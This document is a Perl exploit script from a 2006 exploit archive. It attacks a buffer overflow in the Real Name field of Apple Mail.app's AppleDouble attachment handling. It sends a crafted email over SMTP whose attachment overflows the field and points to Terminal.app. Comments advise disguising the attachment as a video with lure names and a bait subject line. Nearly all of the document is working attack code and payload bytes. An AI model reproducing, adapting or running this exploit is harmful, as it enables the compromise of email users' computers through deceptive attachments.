<html><head><title>Apple Mac OS X 10.4.5 Mail.app (Real Name) Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
#
# Code by Kevin Finisterre kf_lists[at]digitalmunition[dot]com
# http://www.digitalmunition.com 
#
# Mail.app Version 2.0.7 (746.2) on OSX 10.4.5 Build 8H14 + Security Update 2006-001 (PowerPC) v1.0
#
# RFC-1740 MIME-based Mac file buffer overflow
# 
# AppleSingle file header:
# [4 byte magic number][4 byte version number][16 bytes of filler][2 byte number of entries][Entry...]
# Entry descriptor for each Entry:
# [4 byte entry id][4 byte offset][4 byte length]
# Real Name entry id is 0x03, Finder Info is 0x09 and Resource Fork is 0x02
#
# If this exploit is not working clean out your ~/Library/Mail Downloads folder
#
# ./SuperTastey.pl mx.yourhost.com yourmac\@someplace.com
#
use IO::Socket;
use MIME::Base64;
$hostName = $ARGV[0];
$emailaddy = $ARGV[1];

$sock = IO::Socket::INET-&gt;new (Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $hostName, PeerPort =&gt; 25, Type =&gt; SOCK_STREAM);
$sock or die &quot;no socket :$!\n&quot;; 
print $sock &quot;EHLO [192.168.1.7]\r\n&quot; .
&quot;MAIL FROM:&lt;root&gt;\r\n&quot; .   # This needs to be valid for what ever server you are using. 
&quot;RCPT TO:&lt;$emailaddy&gt;\r\n&quot; .	      # Target machine goes email address here. 
&quot;DATA\r\n&quot; .
&quot;Mime-Version: 1.0 (Apple Message framework v746.2)\r\n&quot; .
&quot;To: kfinisterre\@blah.com\r\n&quot; .
&quot;Message-Id: &lt;1AE65A5B-6E3A-479B-8ECB-8BC4D959A69A\@blah.com\r\n&quot; .
&quot;Content-Type: multipart/mixed; boundary=Apple-Mail-3-188295813\r\n&quot; .
&quot;From: root &lt;root&gt;\r\n&quot; .
&quot;Subject: Dude you have to see this shit!\r\n&quot; .
&quot;Date: Mon, 6 Mar 2006 23:04:12 -0500\r\n&quot; .
&quot;X-Mailer: Apple Mail (2.746.2)\r\n&quot; .
&quot;\r\n&quot; .
&quot;\r\n&quot; .
&quot;--Apple-Mail-3-188295813\r\n&quot; .
&quot;Content-Type: multipart/appledouble;\r\n&quot; .
&quot;\tboundary=Apple-Mail-4-188295813\r\n&quot; .
&quot;Content-Disposition: attachment\r\n&quot; .
&quot;\r\n&quot; .
&quot;\r\n&quot; .
&quot;--Apple-Mail-4-188295813\r\n&quot; .
&quot;Content-Transfer-Encoding: base64\r\n&quot; .
&quot;Content-Type: application/applefile;\r\n&quot; .
&quot;\tname=\&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.mov\&quot;\r\n&quot; .
&quot;Content-Disposition: attachment;\r\n&quot; .
&quot;\tfilename*1=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.mov\r\n&quot; .
&quot;\r\n&quot;;

$retaddr = &quot;\x41\x42\x43\x44&quot;;  # Shit the spec says printable ASCII!

$bufferz  = 

&quot;\x00\x05\x16\x07&quot;.	# AppleDouble Magic Number
&quot;\x00\x02\x00\x00&quot;.	# Version 2
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.	# 16 Bytes of &lt;null&gt; filler
&quot;\x00\x03\x00\x00&quot;.	# Number of entries (3)
&quot;\x00\x09\x00\x00&quot;.	# Entry ID 9 is for 'Finder Info'
&quot;\x00\x3e\x00\x00&quot;.	# Start of Finder Info data is at file offset 0x3e
&quot;\x00\x0a\x00\x00&quot;.	# Length of Finder Info is 0x0a or 10
&quot;\x00\x03\x00\x00&quot;.	# Entry ID 3 is for 'Real Name'
&quot;\x00\x48\x00\x00&quot;.	# Start of Real Name data is at file offset 0x48
&quot;\x00\xf5\x00\x00&quot;.	# Length of Real Name is 0xf5 or 245
&quot;\x00\x02\x00\x00&quot;.	# Entry ID 2 is for 'Resource Fork'
&quot;\x01\x3d\x00\x00&quot;.	# Start of Resource Fork is at file offset 0x013d
&quot;\x05\x3a\x00\x00&quot;.	# Length of Resource fork is 0x053a
&quot;\x00\x00\x00\x00&quot;.	# &lt;null&gt; filler
&quot;\x00\x00\x00\x00&quot;.	# &lt;null&gt; filler
&quot;aa&quot; x 109 . &quot;0000&quot; . &quot;1111&quot; .  &quot;2222&quot; . &quot;$retaddr&quot; x 1 . &quot;3333&quot; . &quot;zzz.mov.&quot; . # remember this length is hard coded above. 
# Anything over 11 chars is here not seen by the user try Something like NakedChicks...mov 
# or SuperTastey...mov don't forget the trailing '.' both .mov and .jpg work well from a Visual standpoint
#
# No fscking clue what this is... it is stolen from MetaSploit. 
# I think its just a resource fork. 
&quot;\x00\x01\x00\x00\x00\x05\x08\x00\x00\x04\x08\x00\x00\x00\x32\x00&quot;. 
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x04\x04\x00\x00\x00\x25\x2f\x41\x70\x70\x6c\x69&quot;.
&quot;\x63\x61\x74\x69\x6f\x6e\x73\x2f\x55\x74\x69\x6c\x69\x74\x69\x65&quot;.
&quot;\x73\x2f\x54\x65\x72\x6d\x69\x6e\x61\x6c\x2e\x61\x70\x70\x00\xec&quot;.
&quot;\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
&quot;\xec\xec\xff\xec\xec\xec\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1&quot;.
&quot;\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1&quot;.
&quot;\xe1\xe1\xff\xe1\xe1\xe1\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6&quot;.
&quot;\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6&quot;.
&quot;\xe6\xe6\xff\xe6\xe6\xe6\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9&quot;.
&quot;\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9&quot;.
&quot;\xe9\xe9\xff\xe9\xe9\xe9\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
&quot;\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
&quot;\xec\xec\xff\xec\xec\xec\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef&quot;.
&quot;\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef&quot;.
&quot;\xef\xef\xff\xef\xef\xef\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3&quot;.
&quot;\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3&quot;.
&quot;\xf3\xf3\xff\xf3\xf3\xf3\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6&quot;.
&quot;\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6&quot;.
&quot;\xf6\xf6\xff\xf6\xf6\xf6\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8&quot;.
&quot;\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8&quot;.
&quot;\xf8\xf8\xff\xf8\xf8\xf8\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc&quot;.
&quot;\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc&quot;.
&quot;\xfc\xfc\xff\xfc\xfc\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
&quot;\xff\xff\xff\xff\xff\xff\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00&quot;.
&quot;\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00&quot;.
&quot;\x00\x00\xa8\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00&quot;.
&quot;\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00&quot;.
&quot;\x00\x00\x2a\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00&quot;.
&quot;\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00&quot;.
&quot;\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00&quot;.
&quot;\x05\x08\x00\x00\x04\x08\x00\x00\x00\x32\x00\x5f\xd0\xac\x12\xc2&quot;.
&quot;\x00\x00\x00\x1c\x00\x32\x00\x00\x75\x73\x72\x6f\x00\x00\x00\x0a&quot;.
&quot;\x00\x00\xff\xff\x00\x00\x00\x00\x01\x0d\x21\x7c&quot;;

print $sock encode_base64($bufferz) .
&quot;\r\n&quot; .
&quot;--Apple-Mail-4-188295813\r\n&quot; .
&quot;Content-Transfer-Encoding: 8bit\r\n&quot; .
&quot;Content-Id: &lt;1A628FD3-CED7-4C69-B5A6-5ABA7AEB2891\@local&gt;\r\n&quot; .
&quot;Content-Type: video/quicktime;\r\n&quot; .
&quot;\tx-mac-type=0;\r\n&quot; .
&quot;\tx-unix-mode=0755;\r\n&quot; .
&quot;\tx-mac-creator=0;\r\n&quot; .
&quot;\tname=\&quot;DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.mov\&quot;\r\n&quot; .
&quot;Content-Disposition: attachment;\r\n&quot; .
&quot;\tfilename*0=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE.mov;\r\n&quot; .
#&quot;\r\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF!\r\n&quot; .
&quot;\r\n&quot; . &quot;Z&quot; x 90000 . &quot;\r\n&quot; .
&quot;--Apple-Mail-4-188295813--\r\n&quot; .
&quot;\r\n&quot; .
&quot;--Apple-Mail-3-188295813--\r\n&quot; .
&quot;.\r\n&quot;;
sleep 2;  # Allow enough time for the message to process before leaving 

# milw0rm.com [2006-03-13]</pre></html>